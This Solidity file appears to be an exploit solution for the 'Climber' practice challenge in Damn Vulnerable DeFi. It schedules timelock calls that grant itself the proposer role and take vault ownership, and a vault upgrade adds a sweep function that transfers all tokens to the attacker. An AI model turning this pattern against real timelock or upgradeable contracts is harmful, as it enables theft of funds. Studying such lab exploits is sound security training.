pragma solidity >=0.8.17;

import "forge-std/console.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {DamnValuableToken} from "src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "src/Contracts/climber/ClimberVault.sol";

contract ClimberAttack {
  address[] targets = new address[](3);
  uint256[] values = new uint256[](3);
  bytes[] dataElements = new bytes[](3);
  bytes32 salt = 0;

  address payable timelock;

  constructor(
    address _timelock,
    address vault
  ){
    timelock = payable(_timelock);

    targets = [_timelock, vault, address(this)];
    values = [0, 0, 0];

    dataElements[0] = abi.encodeWithSignature(
      "grantRole(bytes32,address)",
      ClimberTimelock(payable(timelock)).PROPOSER_ROLE(),
      address(this)
    );

    dataElements[1] = abi.encodeWithSignature(
      "transferOwnership(address)",
      address(this)
    );

    dataElements[2] = abi.encodeWithSignature(
      "addSchedule()",
      address(this)
    );
  }

  function addSchedule() public {
    ClimberTimelock(timelock).schedule(targets, values, dataElements, salt);
  }

  function execute() public {
    ClimberTimelock(timelock).execute(targets, values, dataElements, salt);
  }
}

contract ClimberVaultUpgrade is ClimberVault {
  constructor() initializer {}

  function sweep(address token) public {
    IERC20 _token = IERC20(token);
    _token.transfer(msg.sender, _token.balanceOf(address(this)));
  }
}
